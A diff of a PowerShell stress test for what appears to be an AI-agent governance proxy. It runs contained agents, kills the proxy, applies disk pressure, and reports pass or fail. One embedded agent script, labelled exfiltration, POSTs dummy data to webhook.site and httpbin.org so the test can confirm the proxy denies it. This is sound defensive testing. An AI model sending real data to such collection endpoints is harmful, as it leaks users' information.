@@ -1,14 +1,14 @@
 # ═══════════════════════════════════════════════════════════════════
 # Analemma GVM — 1-Hour Stress Test (Windows Docker / Contained Mode)
 #
-# Runs multiple agent instances through GVM proxy in --contained mode
-# with chaos injection. Collects metrics every 60s.
+# Runs agent instances through GVM proxy in --contained mode with
+# chaos injection. Collects metrics every 60s. Reports pass/fail.
 #
 # Requirements:
 #   - Windows 10/11 with Docker Desktop
-#   - ANTHROPIC_API_KEY environment variable
+#   - .env file with ANTHROPIC_API_KEY (or env var)
 #   - GVM proxy + CLI built (cargo build --release)
-#   - Python 3.12+ (for agent scripts)
+#   - Python 3.12+
 #
 # Usage:
 #   .\scripts\stress-test.ps1
@@ -16,9 +16,10 @@
 # ═══════════════════════════════════════════════════════════════════
 
 param(
-    [int]$Duration = 60,      # minutes
+    [int]$Duration = 60,
     [int]$Agents = 5,
-    [int]$StaggerSec = 60
+    [int]$StaggerSec = 60,
+    [int]$MaxMemIncreaseMB = 100
 )
 
 $ErrorActionPreference = "Continue"
@@ -34,23 +35,45 @@ $MetricsCsv = Join-Path $ResultsDir "metrics.csv"
 $ChaosLog = Join-Path $ResultsDir "chaos.log"
 $Summary = Join-Path $ResultsDir "summary.txt"
 
-# Create results directory
+# Chaos timing (minutes)
+$ChaosKillMin = 15
+$ChaosDiskMin = 35
+$ChaosDiskReleaseMin = 40
+
 New-Item -ItemType Directory -Force -Path "$ResultsDir\agents" | Out-Null
+
+# ── Load .env ──
+$envFile = Join-Path $RepoDir ".env"
+if (Test-Path $envFile) {
+    Get-Content $envFile | ForEach-Object {
+        if ($_ -match '^\s*([^#][^=]+)=(.*)$') {
+            $key = $Matches[1].Trim()
+            $val = $Matches[2].Trim()
+            [System.Environment]::SetEnvironmentVariable($key, $val, "Process")
+        }
+    }
+    Write-Host "  Loaded .env" -ForegroundColor DarkGray
+}
 
 Write-Host "`n=== GVM Stress Test (Windows Docker) ===" -ForegroundColor Cyan
 Write-Host "  Mode:       contained (Docker)"
 Write-Host "  Duration:   ${Duration}m"
 Write-Host "  Agents:     $Agents"
 Write-Host "  Results:    $ResultsDir"
+Write-Host "  Chaos:      T+${ChaosKillMin}m kill, T+${ChaosDiskMin}m disk"
 Write-Host ""
 
 # ── Validation ──
 if (-not $env:ANTHROPIC_API_KEY) {
-    Write-Host "ERROR: ANTHROPIC_API_KEY not set" -ForegroundColor Red
+    Write-Host "ERROR: ANTHROPIC_API_KEY not set (check .env file)" -ForegroundColor Red
     exit 1
 }
 if (-not (Test-Path $ProxyBin)) {
     Write-Host "ERROR: Proxy not built: $ProxyBin" -ForegroundColor Red
+    exit 1
+}
+if (-not (Test-Path $GvmBin)) {
+    Write-Host "ERROR: CLI not built: $GvmBin" -ForegroundColor Red
     exit 1
 }
 if (-not (docker version 2>$null)) {
@@ -58,13 +81,12 @@ if (-not (docker version 2>$null)) {
     exit 1
 }
 
-# Verify host.docker.internal is resolvable from Docker (WSL2 known issue)
-Write-Host "  Checking host.docker.internal resolution..." -NoNewline
+# Verify host.docker.internal (WSL2 known issue)
+Write-Host "  Checking host.docker.internal..." -NoNewline
 $hostCheck = docker run --rm python:3.12-slim python3 -c "import socket; socket.getaddrinfo('host.docker.internal', 8080)" 2>&1
 if ($LASTEXITCODE -ne 0) {
     Write-Host " FAILED" -ForegroundColor Red
-    Write-Host "  host.docker.internal is not resolvable from Docker containers."
-    Write-Host "  This is a known WSL2/Docker Desktop issue. Try restarting Docker Desktop."
+    Write-Host "  host.docker.internal is not resolvable. Restart Docker Desktop."
     exit 1
 }
 Write-Host " OK" -ForegroundColor Green
@@ -76,84 +98,78 @@ $ProxyJob = Start-Process -FilePath $ProxyBin -ArgumentList "--config", "$RepoDi
 $ProxyPid = $ProxyJob.Id
 Start-Sleep -Seconds 3
 
-# Verify health
 try {
     $health = Invoke-RestMethod -Uri "$ProxyUrl/gvm/health" -TimeoutSec 5
-    if ($health.status -ne "healthy") { throw "unhealthy" }
+    if ($health.status -ne "healthy") { throw "unhealthy: $($health.status)" }
     Write-Host "  Proxy started (PID $ProxyPid)" -ForegroundColor Green
 } catch {
-    Write-Host "ERROR: Proxy failed to start" -ForegroundColor Red
+    Write-Host "ERROR: Proxy failed to start: $_" -ForegroundColor Red
     exit 1
 }
 
-# ── Metrics CSV Header ──
-"timestamp,elapsed_sec,proxy_mem_mb,proxy_cpu,docker_containers,proxy_healthy,wal_bytes" | Out-File -FilePath $MetricsCsv -Encoding utf8
+# Record initial memory
+$InitialMem = [math]::Round((Get-Process -Id $ProxyPid).WorkingSet64 / 1MB, 1)
 
-# ── Agent Scripts ──
-$AgentScripts = @(
-    @{ Id=1; Name="github-read"; Code=@'
-import requests, time, random
-proxy = "http://host.docker.internal:8080"
-proxies = {"http": proxy, "https": proxy}
-repos = ["torvalds/linux", "rust-lang/rust", "golang/go", "python/cpython"]
-for i in range(100):
-    repo = random.choice(repos)
-    try:
-        r = requests.get(f"http://api.github.com/repos/{repo}/issues?per_page=1", proxies=proxies, timeout=15)
-        print(f"[{i}] GET {repo}/issues -> {r.status_code}")
-    except Exception as e:
-        print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(10, 30))
-'@},
-    @{ Id=2; Name="exfiltration"; Code=@'
-import requests, time, random
-proxy = "http://host.docker.internal:8080"
-proxies = {"http": proxy, "https": proxy}
-targets = ["http://webhook.site/test", "http://httpbin.org/post"]
-for i in range(100):
-    url = random.choice(targets)
-    try:
-        r = requests.post(url, json={"data": f"stress-{i}"}, proxies=proxies, timeout=15)
-        print(f"[{i}] POST {url} -> {r.status_code}")
-    except Exception as e:
-        print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(10, 30))
-'@},
-    @{ Id=3; Name="unknown-hosts"; Code=@'
-import requests, time, random
-proxy = "http://host.docker.internal:8080"
-proxies = {"http": proxy, "https": proxy}
-urls = [
-    "http://catfact.ninja/fact", "http://dog.ceo/api/breeds/image/random",
-    "http://api.coindesk.com/v1/bpi/currentprice.json", "http://numbersapi.com/42",
-    "http://api.agify.io/?name=test", "http://api.genderize.io/?name=test",
-]
+# ── CSV Header ──
+"timestamp,elapsed_sec,rss_mb,docker_containers,proxy_healthy,wal_bytes" | Out-File -FilePath $MetricsCsv -Encoding utf8
+
+# ── Agent Scripts (Python fallback + OpenClaw if available) ──
+$AgentCodes = @(
+    # Agent 1: GitHub read (Allow path)
+    'import requests,time,random,os
+proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
+px={"http":proxy,"https":proxy}
+repos=["torvalds/linux","rust-lang/rust","golang/go","python/cpython"]
 for i in range(200):
-    url = random.choice(urls)
+    r=repos[i%len(repos)]
     try:
-        r = requests.get(url, proxies=proxies, timeout=15)
-        print(f"[{i}] GET {url} -> {r.status_code}")
-    except Exception as e:
-        print(f"[{i}] ERR: {e}")
-    time.sleep(random.uniform(5, 15))
-'@},
+        resp=requests.get(f"http://api.github.com/repos/{r}/issues?per_page=1",proxies=px,timeout=15)
+        print(f"[{i}] GET {r}/issues -> {resp.status_code}")
+    except Exception as e: print(f"[{i}] ERR: {e}")
+    time.sleep(random.uniform(10,25))',
+    # Agent 2: Exfiltration (Deny path)
+    'import requests,time,random,os
+proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
+px={"http":proxy,"https":proxy}
+targets=["http://webhook.site/test","http://httpbin.org/post"]
+for i in range(200):
+    url=random.choice(targets)
+    try:
+        resp=requests.post(url,json={"d":f"s{i}"},proxies=px,timeout=15)
+        print(f"[{i}] POST {url} -> {resp.status_code}")
+    except Exception as e: print(f"[{i}] ERR: {e}")
+    time.sleep(random.uniform(10,25))',
+    # Agent 3: Unknown hosts (Default-to-Caution, high volume)
+    'import requests,time,random,os
+proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
+px={"http":proxy,"https":proxy}
+urls=["http://catfact.ninja/fact","http://dog.ceo/api/breeds/image/random",
+"http://api.coindesk.com/v1/bpi/currentprice.json","http://numbersapi.com/42",
+"http://api.agify.io/?name=test","http://api.genderize.io/?name=test",
+"http://api.chucknorris.io/jokes/random","http://worldtimeapi.org/api/ip"]
+for i in range(300):
+    url=random.choice(urls)
+    try:
+        resp=requests.get(url,proxies=px,timeout=15)
+        print(f"[{i}] GET {url} -> {resp.status_code}")
+    except Exception as e: print(f"[{i}] ERR: {e}")
+    time.sleep(random.uniform(5,12))'
 )
 
 # ── Launch Agents ──
 $AgentProcesses = @()
-$agentCount = [Math]::Min($Agents, $AgentScripts.Count)
+$agentCount = [Math]::Min($Agents, $AgentCodes.Count)
 for ($i = 0; $i -lt $agentCount; $i++) {
-    $agent = $AgentScripts[$i]
-    $scriptPath = Join-Path $ResultsDir "agents\agent-$($agent.Id).py"
-    $agent.Code | Out-File -FilePath $scriptPath -Encoding utf8
+    $scriptPath = Join-Path $ResultsDir "agents\agent-$($i+1).py"
+    $AgentCodes[$i] | Out-File -FilePath $scriptPath -Encoding utf8 -NoNewline
+    Write-Host "  Starting agent #$($i+1)..." -ForegroundColor Cyan
 
-    Write-Host "  Starting agent #$($agent.Id) ($($agent.Name))..." -ForegroundColor Cyan
-
-    $agentJob = Start-Process -FilePath $GvmBin -ArgumentList "run", "--contained", "--agent-id", "stress-$($agent.Id)", $scriptPath `
-        -RedirectStandardOutput "$ResultsDir\agents\agent-$($agent.Id).log" `
-        -RedirectStandardError "$ResultsDir\agents\agent-$($agent.Id)-err.log" `
+    $proc = Start-Process -FilePath $GvmBin `
+        -ArgumentList "run","--contained","--agent-id","stress-$($i+1)",$scriptPath `
+        -RedirectStandardOutput "$ResultsDir\agents\agent-$($i+1).log" `
+        -RedirectStandardError "$ResultsDir\agents\agent-$($i+1)-err.log" `
         -PassThru -NoNewWindow
-    $AgentProcesses += $agentJob
+    $AgentProcesses += $proc
 
     if ($i -lt ($agentCount - 1)) {
         Write-Host "  Staggering ${StaggerSec}s..." -ForegroundColor DarkGray
@@ -167,71 +183,79 @@ $StartTime = Get-Date
 $DurationSec = $Duration * 60
 $ChaosKillDone = $false
 $ChaosDiskDone = $false
+$ChaosDiskReleased = $false
+$MaxRss = $InitialMem
+$FdIncreases = 0
+$PrevContainers = 0
 
 Write-Host "`nTest running for ${Duration} minutes..." -ForegroundColor White
-Write-Host "  Chaos: T+20m (proxy kill), T+40m (disk pressure)" -ForegroundColor DarkGray
 
 while ($true) {
     $elapsed = ((Get-Date) - $StartTime).TotalSeconds
     if ($elapsed -ge $DurationSec) { break }
-
     $elapsedMin = [int]($elapsed / 60)
 
-    # Collect metrics
+    # ── Collect Metrics ──
     try {
         $proc = Get-Process -Id $ProxyPid -ErrorAction SilentlyContinue
         $memMb = if ($proc) { [math]::Round($proc.WorkingSet64 / 1MB, 1) } else { 0 }
-        $cpu = if ($proc) { [math]::Round($proc.CPU, 1) } else { 0 }
+        if ($memMb -gt $MaxRss) { $MaxRss = $memMb }
         $containers = (docker ps -q 2>$null | Measure-Object).Count
         $healthy = try { (Invoke-RestMethod -Uri "$ProxyUrl/gvm/health" -TimeoutSec 2).status } catch { "dead" }
         $walBytes = if (Test-Path "$RepoDir\data\wal.log") { (Get-Item "$RepoDir\data\wal.log").Length } else { 0 }
         $ts = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
-        "$ts,$([int]$elapsed),$memMb,$cpu,$containers,$healthy,$walBytes" | Out-File -FilePath $MetricsCsv -Encoding utf8 -Append
-        Write-Host "  [$ts] RSS=${memMb}MB containers=$containers health=$healthy" -ForegroundColor DarkGray
-    } catch {}
+        "$ts,$([int]$elapsed),$memMb,$containers,$healthy,$walBytes" | Out-File -FilePath $MetricsCsv -Encoding utf8 -Append
+        Write-Host "  [$ts] RSS=${memMb}MB containers=$containers health=$healthy WAL=$([math]::Round($walBytes/1KB))KB" -ForegroundColor DarkGray
+    } catch { }
 
-    # Chaos: T+20 proxy kill
-    if ($elapsedMin -ge 15 -and -not $ChaosKillDone) {
+    # ── Chaos: T+15 proxy kill ──
+    if ($elapsedMin -ge $ChaosKillMin -and -not $ChaosKillDone) {
         $ChaosKillDone = $true
         $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
         "[$ts] INJECT: taskkill proxy (PID $ProxyPid)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
         Write-Host "  CHAOS: Killing proxy!" -ForegroundColor Yellow
         Stop-Process -Id $ProxyPid -Force -ErrorAction SilentlyContinue
-
-        # Wait for manual restart (Windows has no watchdog)
         Start-Sleep -Seconds 5
-        $ProxyJob = Start-Process -FilePath $ProxyBin -ArgumentList "--config", "$RepoDir\config\proxy.toml" `
+
+        # Restart
+        $ProxyJob = Start-Process -FilePath $ProxyBin -ArgumentList "--config","$RepoDir\config\proxy.toml" `
             -RedirectStandardOutput "$ResultsDir\proxy-restart.log" -PassThru -NoNewWindow
         $ProxyPid = $ProxyJob.Id
         Start-Sleep -Seconds 3
         "[$ts] RESTART: proxy PID $ProxyPid" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
 
-        # Verify SRR rules loaded after restart (fail-open prevention)
-        Start-Sleep -Seconds 2
+        # Verify SRR rules
         try {
             $check = Invoke-RestMethod -Uri "$ProxyUrl/gvm/check" -Method POST `
                 -ContentType "application/json" `
-                -Body '{"method":"POST","target_host":"webhook.site","target_path":"/test","operation":"test"}' `
-                -TimeoutSec 5
+                -Body '{"method":"POST","target_host":"webhook.site","target_path":"/test","operation":"test"}' -TimeoutSec 5
             if ($check.decision -match "Deny") {
-                "[$ts] VERIFY: SRR rules loaded (webhook.site -> Deny)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
+                "[$ts] VERIFY: SRR loaded (webhook.site->Deny)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
             } else {
-                "[$ts] FAIL: SRR rules NOT loaded — fail-open risk (got: $($check.decision))" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
+                "[$ts] FAIL: SRR NOT loaded — fail-open (got: $($check.decision))" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
             }
         } catch {
-            "[$ts] WARN: SRR verification failed (proxy may still be starting)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
+            "[$ts] WARN: SRR verify failed" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
         }
     }
 
-    # Chaos: T+40 disk pressure (create large file in WAL directory)
-    if ($elapsedMin -ge 35 -and -not $ChaosDiskDone) {
+    # ── Chaos: T+35 disk pressure ──
+    if ($elapsedMin -ge $ChaosDiskMin -and -not $ChaosDiskDone) {
         $ChaosDiskDone = $true
         $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
-        "[$ts] INJECT: disk pressure" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
+        "[$ts] INJECT: disk pressure (100MB fill)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
         Write-Host "  CHAOS: Disk pressure!" -ForegroundColor Yellow
-        # Create 100MB file
         $fillPath = Join-Path $RepoDir "data\stress-fill.dat"
         [System.IO.File]::WriteAllBytes($fillPath, (New-Object byte[] (100MB)))
+    }
+
+    # ── Chaos: T+40 disk release ──
+    if ($elapsedMin -ge $ChaosDiskReleaseMin -and -not $ChaosDiskReleased) {
+        $ChaosDiskReleased = $true
+        $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
+        Remove-Item -Path "$RepoDir\data\stress-fill.dat" -ErrorAction SilentlyContinue
+        "[$ts] RESTORE: disk pressure released" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
+        Write-Host "  CHAOS: Disk released" -ForegroundColor Green
     }
 
     Start-Sleep -Seconds 60
@@ -243,14 +267,52 @@ foreach ($proc in $AgentProcesses) {
     Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
 }
 Stop-Process -Id $ProxyPid -Force -ErrorAction SilentlyContinue
-docker ps -q --filter "name=gvm-agent" | ForEach-Object { docker rm -f $_ 2>$null }
+docker ps -q --filter "name=gvm-agent" 2>$null | ForEach-Object { docker rm -f $_ 2>$null }
 Remove-Item -Path "$RepoDir\data\stress-fill.dat" -ErrorAction SilentlyContinue
 
-# ── Summary ──
-"=== Stress Test Summary (Windows Docker) ===" | Out-File -FilePath $Summary -Encoding utf8
-"Duration: ${Duration}m" | Out-File -FilePath $Summary -Encoding utf8 -Append
-"Agents: $agentCount" | Out-File -FilePath $Summary -Encoding utf8 -Append
-"Results: $ResultsDir" | Out-File -FilePath $Summary -Encoding utf8 -Append
+# ── Pass/Fail Evaluation ──
+Write-Host "`n=== Pass/Fail Evaluation ===" -ForegroundColor Cyan
+$pass = $true
 
-Write-Host "`nResults saved to: $ResultsDir" -ForegroundColor Cyan
+# 1. Memory
+$memIncrease = [math]::Round($MaxRss - $InitialMem, 1)
+$memResult = if ($memIncrease -gt $MaxMemIncreaseMB) { $pass = $false; "FAIL" } else { "PASS" }
+"memory: initial=${InitialMem}MB max=${MaxRss}MB increase=${memIncrease}MB (limit: ${MaxMemIncreaseMB}MB) $memResult" | Out-File -FilePath $Summary -Encoding utf8 -Append
+Write-Host "  Memory: ${memResult} (${memIncrease}MB increase)" -ForegroundColor $(if ($memResult -eq "PASS") {"Green"} else {"Red"})
+
+# 2. Proxy restart (check chaos.log)
+if (Test-Path $ChaosLog) {
+    if (Select-String -Path $ChaosLog -Pattern "RESTART" -Quiet) {
+        "PASS: proxy restarted after kill" | Out-File -FilePath $Summary -Encoding utf8 -Append
+        Write-Host "  Proxy restart: PASS" -ForegroundColor Green
+    }
+    if (Select-String -Path $ChaosLog -Pattern "FAIL.*SRR NOT loaded" -Quiet) {
+        $pass = $false
+        "FAIL: SRR rules not loaded after restart" | Out-File -FilePath $Summary -Encoding utf8 -Append
+        Write-Host "  SRR after restart: FAIL" -ForegroundColor Red
+    }
+}
+
+# 3. WAL integrity
+if (Test-Path "$RepoDir\data\wal.log") {
+    & $GvmBin audit verify --wal "$RepoDir\data\wal.log" 2>&1 | Out-File -FilePath "$ResultsDir\wal-verify.txt" -Encoding utf8
+    # Export audit log
+    & $GvmBin audit export --since 2h --wal "$RepoDir\data\wal.log" --format jsonl 2>$null | Out-File -FilePath "$ResultsDir\audit-export.jsonl" -Encoding utf8
+    $eventCount = (Get-Content "$ResultsDir\audit-export.jsonl" -ErrorAction SilentlyContinue | Measure-Object).Count
+    "audit_export: $eventCount events" | Out-File -FilePath $Summary -Encoding utf8 -Append
+}
+
+# 4. Verdict
+"" | Out-File -FilePath $Summary -Encoding utf8 -Append
+if ($pass) {
+    "=== VERDICT: PASS ===" | Out-File -FilePath $Summary -Encoding utf8 -Append
+    New-Item -ItemType File -Path "$ResultsDir\PASS" -Force | Out-Null
+    Write-Host "`n=== VERDICT: PASS ===" -ForegroundColor Green
+} else {
+    "=== VERDICT: FAIL ===" | Out-File -FilePath $Summary -Encoding utf8 -Append
+    New-Item -ItemType File -Path "$ResultsDir\FAIL" -Force | Out-Null
+    Write-Host "`n=== VERDICT: FAIL ===" -ForegroundColor Red
+}
+
+Write-Host "`nResults: $ResultsDir" -ForegroundColor Cyan
 Get-Content $Summary
